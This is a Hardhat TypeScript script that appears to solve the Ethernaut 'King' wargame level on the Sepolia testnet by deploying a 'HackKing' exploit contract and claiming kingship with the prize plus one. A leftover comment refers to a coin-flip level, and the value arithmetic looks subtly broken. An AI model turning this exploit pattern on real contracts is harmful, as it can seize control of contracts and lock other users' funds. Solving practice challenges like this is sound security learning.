import { ethers, network } from "hardhat";
import * as dotenv from 'dotenv';
import { Contract } from "ethers";

dotenv.config();

async function main() {
    // We only verify on Sepolia!
    if (network.config.chainId != 11155111) {
        console.log("Ethernaut contracts in this repo can only be run on the Sepolia Network");

    } else {

        const contractAddress: string = process.env.CONTRACT_INSTANCE_ADDRESS ? process.env.CONTRACT_INSTANCE_ADDRESS : ethers.constants.AddressZero;
        const contract: Contract = await ethers.getContractAt('King', contractAddress);

        console.log("Contract Instance Loaded");

        // Deploy the hack coin flip contract with a guess goal of 10
        const exploitFactory = await ethers.getContractFactory("HackKing");
        const exploitKingContract = await exploitFactory.deploy(contractAddress);

        const attackReceipt = await exploitKingContract.becomeKing({ value: await contract.prize() + 1 });

        await attackReceipt.wait(2);
        console.log("Exploit contract is king");
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })